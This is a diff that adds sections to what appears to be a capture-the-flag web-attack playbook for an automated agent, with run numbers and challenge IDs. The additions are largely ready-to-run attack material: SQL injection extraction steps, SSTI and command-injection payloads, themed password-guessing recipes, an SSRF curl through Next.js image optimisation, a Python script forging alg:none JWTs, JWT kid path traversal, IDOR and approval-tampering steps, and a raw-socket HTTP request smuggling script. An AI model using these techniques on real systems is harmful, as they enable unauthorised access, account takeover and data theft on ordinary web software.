@@ -6,6 +6,21 @@ exploit to flag.
 1. **SQLi**: error-based first (`'`, `"`), then UNION (match column count with
    ORDER BY), then boolean/time blind via sqlmap --batch. Dump the table that
    holds flag/admin password.
+   **Extraction robustness (run-9115 lesson: admin_logs returned `NORET
+   len=1309` for 5+ queries across 9 rounds — the extractor was broken, the
+   table was never read; nobody debugged the tool)**:
+   - Empty/identical/constant-length extraction output = **your extractor is
+     broken**, NOT "the table is empty". Debug the tool before concluding.
+   - Fallback ladder when a column won't render: (1) `hex()` the expression
+     (`hex(group_concat(...))` — dodges charset/width issues); (2) row-by-row
+     `LIMIT n,1` instead of group_concat (long group_concats truncate);
+     (3) `SUBSTR(expr,off,200)` paging; (4) `ORD()`/`ASCII()` per-char for the
+     stubborn tail; (5) `CHAR()` reassembly.
+   - Verify the extractor on a KNOWN value first (`SELECT @@version` through
+     the same injection path) — if that doesn't come back, fix the path, don't
+     query the real target through a broken pipe.
+   - Dump EVERY table before leaving the DB: logs/hosts/config tables are
+     where later-stage credentials hide.
 2. **SSTI**: `{{7*7}}`, `{{config}}` in every param; Jinja/Twig/Smarty payloads;
    RCE via `''.__class__.__mro__` chain or `system()`.
 3. **Command injection**: `;id`, `|id`, `` `id` ``, `$(id)`, newline `%0aid`;
@@ -25,12 +40,47 @@ exploit to flag.
 9. **XXE**: swap JSON→XML bodies; external entities `file://`, phar.
 10. **Auth/IDOR (see system.md §4)**: register 2 accounts; enum IDs; role
     tamper; JWT attacks; password reset flow flaws; weak creds (admin/admin,
-    hydra on login only if nothing else moves).
+    hydra on login only if nothing else moves). **Weak-cred lists must be
+    THEMED, not just generic**: brand/product/company words from the challenge
+    description and page footers × {2023..2026,123,!,@} (e.g. a "泛微" system →
+    `Weaver@2023`; "深科" → `deeptech@2023`, `shenke@2024`), plus
+    username×suffix (`employee123`, `sysadmin2023`). Challenge passwords come
+    from the challenge's own corpus — see playbook_killchain §"Password attack
+    standard procedure" for the full candidate recipe.
 11. **Info leaks**: `.git/HEAD` → dump repo; `.env`, `actuator/`, `console/`,
     `phpinfo`, source in `.bak/.swp`, verbose errors, debug=True.
 
 Flags hide in: DB rows, files readable after RCE/LFI, admin pages, response
 headers of special routes, second-stage internal services (SSRF/pivot).
+
+## Sandboxed / headless-browser XSS (Dalgona, js2py checkers) — read BEFORE grinding XSS
+
+When a challenge renders your input then checks it with a headless browser or a
+Python JS engine (js2py) and reports back whether `alert()` fired:
+
+- **DIAGNOSTIC — do not skip.** If EVERY payload returns the SAME response —
+  including the literal `1`, `true`, `null`, or a non-JS string — the error is
+  coming from the CHECKER's own eval harness, NOT your payload. A real content
+  filter changes behavior per-input; an identical response to all inputs is a
+  sandbox-engine artifact. STOP fuzzing tag/encoding variants: no amount of
+  `<img onerror>` obfuscation fixes a checker that crashes before reading you.
+- The signature `TypeError: Attempting to change the setter of an
+  unconfigurable property` = the checker does
+  `Object.defineProperty(window,'alert',{set:...})` on a non-configurable
+  property. This is the open-source **dalgona** XSS trainer (do9duck/dalgona);
+  each named variant (Star / Umbrella / Heart / …) has ONE intended solution
+  per category.
+- **RESEARCH > FUZZ here.** Spend budget pulling the exact variant's checker
+  source + known solution from the dalgona repo (this host has internet), then
+  craft the single intended payload. Blind fuzzing a crashing checker is a
+  guaranteed time sink (cost us 3 challenges this run: 011/015/018).
+- js2py is an INCOMPLETE JS engine: it cannot redefine native non-configurable
+  accessors, so `Object.defineProperty`, `delete window.alert`, Proxy/Set traps
+  all trip the TypeError. The working angle is usually to fire `alert` through
+  a path the checker does NOT wrap, or feed input the checker's preamble accepts
+  — get the variant's exact template from source first.
+- Seed payloads in `tools/payloads/xss_sandbox.txt` (try in order); note
+  WHICH tag/char each variant's filter blocks, then wrap the surviving vector.
 
 ## Run-6661 iron rules (lost us a-07 — read before any WAF/XXE grind)
 
@@ -88,8 +138,104 @@ headers of special routes, second-stage internal services (SSRF/pivot).
   braces before submitting (`grep -oE 'flag\{[^}]+\}'`); a truncated or
   brace-less string is a wasted submit.
 
-## Field notes round-0 (one-line unlockers — check these BEFORE grinding)
+## JS chunk systematic analysis (do BEFORE manual endpoint enumeration — c-03 lesson)
 
+When a Next.js/React/SPA app has no obvious API entry:
+1. **Download ALL JS chunks** (not just the ones you see in page source):
+   ```bash
+   BASE=<target>
+   curl -s "$BASE/" | grep -oE '(src|href)="[^"]*\.js"' | cut -d'"' -f2 > urls.txt
+   curl -s "$BASE/" | grep -o '/_next/static/chunks/[^"]*\.js' >> urls.txt
+   mkdir -p js && sort -u urls.txt | while read p; do
+     curl -s -m 10 "$BASE$p" -o "js/$(basename $p)"
+   done
+   ```
+2. **Grep for hidden endpoints and real API addresses**:
+   ```bash
+   # Hidden backend ports (API might NOT be on the obvious port)
+   grep -rho 'localhost:[0-9]*/api\|127\.0\.0\.1:[0-9]*/api\|:500[0-9]/api' js/
+   grep -o '.\{100\}localhost:500[0-9].\{150\}' js/*.js  # context around hits
+   # API base URLs / config
+   grep -rho 'baseURL[^,}]*\|API_BASE[^,}]*\|apiUrl[^,}]*' js/
+   # Next.js Server Actions (can call backend directly)
+   grep -rlo 'createServerReference\|ACTION_ID\|\$ACTION\|serverActions' js/
+   # GraphQL endpoints
+   grep -rlo 'graphql\|/gql\|query{' js/ | head -5
+   # WebSocket endpoints
+   grep -rho 'ws://[^"]*\|wss://[^"]*' js/
+   ```
+3. **Test discovered endpoints directly** — the JS often reveals the REAL backend
+   port (e.g., `localhost:5002/api` in JS when the visible frontend is :3000).
+4. **Next.js image optimization SSRF** — if /_next/image exists:
+   ```bash
+   curl -s "$BASE/_next/image?url=http://localhost:5002/api/secret&w=640&q=75"
+   ```
+
+## JWT attacks (when any JWT/token/Authorization header present)
+
+1. **Decode first**:
+   ```bash
+   echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null  # header (check alg, kid)
+   echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null  # payload (check role, email)
+   ```
+2. **alg:none** (if HS256):
+   ```python
+   import base64, json
+   def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
+   header = b64(json.dumps({"alg":"none","typ":"JWT"}).encode())
+   payload = b64(json.dumps({"email":"dev@example.com","role":"admin"}).encode())
+   print(f"{header}.{payload}.")
+   ```
+3. **kid header attacks**: try kid="dev.key", kid="old.key", kid path traversal
+   (kid="../../dev/null"), kid pointing to a known file.
+4. **Claim tampering**: change role → admin, email → admin@x.com, add "admin": true.
+5. **HMAC key brute** (if weak key): use hashcat/john or python hmac itertools.
+6. **Old signing keys**: check if old/migration keys still accepted (dev.key).
+7. **PHP/nginx alias traversal** to READ the signing key file:
+   `/public/static/../../keys/prod.key` (when "migration" is in the description).
+
+## Contract/Approval/Reimbursement systems (a-03 class)
+
+1. **Register 2+ accounts** (employee + different employee).
+2. **Horizontal IDOR**: access other user's contracts/approvals by ID.
+   ```bash
+   # Get employee A's contract list, try accessing by ID
+   curl -b A_cookies "http://T/api/contracts"  # note the IDs
+   curl -b B_cookies "http://T/api/contracts/123"  # B reads A's contract?
+   ```
+3. **Race condition**: submit + approve simultaneously (parallel curl).
+4. **Amount tampering**: negative, zero, huge, float overflow, string.
+5. **Role escalation**: employee accessing admin/manager endpoints directly.
+6. **Batch operations**: bulk endpoints that skip per-item auth checks.
+7. **Status manipulation**: change pending→approved via PUT/PATCH.
+8. **JS route analysis**: download app JS to find ALL routes including hidden ones.
+
+## HTTP Request Smuggling (when behind proxy/load balancer — envoy, cloudflare)
+
+1. **Identify proxy chain**: check Server/X-Via/CF-Ray headers, OPTIONS behavior.
+2. **CL-TE**: Content-Length + Transfer-Encoding chunked together.
+3. **TE-CL**: Transfer-Encoding chunked + Content-Length conflict.
+4. **Raw socket testing** (python):
+   ```python
+   import socket
+   s = socket.create_connection((HOST, 80))
+   s.sendall(b"POST / HTTP/1.1\r\nHost: T\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: T\r\n\r\n")
+   print(s.recv(4096).decode(errors='replace'))
+   ```
+5. **envoy→nginx chain**: envoy may normalize paths differently than nginx →
+   try path variations that bypass envoy routing but hit nginx backends.
+
+
+
+- **LFI as an existence oracle (kills 403/catch-all noise)**: when directory
+  brute is polluted — `.htaccess` returning 403 on every dotfile, or a PHP
+  catch-all returning the homepage 200 for ANY path — so ffuf can't tell real
+  files from noise, repurpose a known LFI/include param (`?file=`, `?page=`,
+  `?id=`, `?template=`) as a file-existence probe. Existing vs non-existing
+  paths produce DIFFERENT LFI responses (content vs "not found" vs error), so
+  diff the response across a wordlist to enumerate the REAL files under
+  `/api/`, `/admin/`, etc. that the front router hides. (ATX used this to map
+  B-02's hidden `/api/` surface through an .htaccess 403 wall.)
 - **.htaccess blocks HTTP requests, NOT LFI reads**: an LFI that "can't read
   config.php because .htaccess denies it" is a misread — read it via the LFI.
 - WAF blocks DOCTYPE/entities ⇒ **XInclude XXE** (xmlns:xi inside body, no
